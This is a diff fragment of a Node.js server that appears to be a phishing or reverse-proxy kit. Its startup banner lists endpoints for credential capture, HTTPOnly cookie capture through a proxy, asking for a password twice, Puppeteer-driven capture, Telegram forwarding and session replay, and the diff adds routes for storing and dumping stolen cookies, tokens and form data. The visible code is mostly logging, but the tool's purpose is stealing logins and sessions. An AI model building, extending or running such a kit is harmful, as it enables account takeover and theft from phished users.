+const PORT = process.env.PORT || 3000;
+
 app.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
     console.log('║                                                           ║');
-    console.log('║   🇰🇷  COMPLETE SERVER - ALL FEATURES                   ║');
+    console.log('║   🍪  COMPLETE INTEGRATED SERVER                        ║');
     console.log('║   🔐  2-CONSECUTIVE PASSWORD VERIFICATION                ║');
-    console.log('║   🍪  HTTPOnly Cookie Capture                           ║');
+    console.log('║   🍪  HTTPOnly Cookie Capture (NO TRUNCATION)           ║');
     console.log('║   🤖  Puppeteer Automation                              ║');
     console.log('║   🌐  Multi-Provider Support (Korean + International)   ║');
+    console.log('║   🔄  Session Replay                                    ║');
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
     console.log(`║   🔗 Proxy:   /proxy/*                                   ║`);
     console.log(`║   🔐 Verify:  POST /api/verify-password                  ║`);
     console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
+    console.log(`║   🍪 Cookie:  POST /api/cookies                         ║`);
+    console.log(`║   🔄 Replay:  POST /api/replay                          ║`);
     console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENABLED' : '❌ DISABLED'}`);
     console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
     console.log('║                                                           ║');
@@ -1190,14 +1645,28 @@ app.listen(PORT, () => {
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║   📊 Endpoints:                                         ║');
-    console.log('║   POST /api/verify-password - Password verification    ║');
-    console.log('║   POST /api/credential-capture - Credential capture   ║');
-    console.log('║   POST /api/telegram - Send Telegram                  ║');
-    console.log('║   GET  /api/verification-status - Status              ║');
-    console.log('║   POST /api/reset-verification - Reset                ║');
-    console.log('║   POST /api/puppeteer-capture - Puppeteer capture    ║');
-    console.log('║   /proxy/* - Proxy with cookie capture               ║');
-    console.log('║   GET  /health - Health check                        ║');
+    console.log('║   POST /api/cookies - Store cookies                    ║');
+    console.log('║   POST /api/tokens - Store tokens                      ║');
+    console.log('║   POST /api/form-data - Store form data                ║');
+    console.log('║   POST /api/replay-data - Store replay data            ║');
+    console.log('║   GET  /api/cookies/all - Get all cookies              ║');
+    console.log('║   GET  /api/session-data - Get complete session        ║');
+    console.log('║   POST /api/replay - Replay session                   ║');
+    console.log('║   POST /api/verify-password - Password verification   ║');
+    console.log('║   POST /api/credential-capture - Credential capture  ║');
+    console.log('║   POST /api/telegram - Send Telegram                 ║');
+    console.log('║   GET  /api/verification-status - Status             ║');
+    console.log('║   POST /api/reset-verification - Reset               ║');
+    console.log('║   POST /api/puppeteer-capture - Puppeteer capture   ║');
+    console.log('║   /proxy/* - Proxy with cookie capture              ║');
+    console.log('║   GET  /health - Health check                       ║');
     console.log('║                                                           ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
+
+// ============================================================
+// CLEANUP
+// ============================================================
+setInterval(() => {
+    sessionStore.cleanup();
+}, 300000);
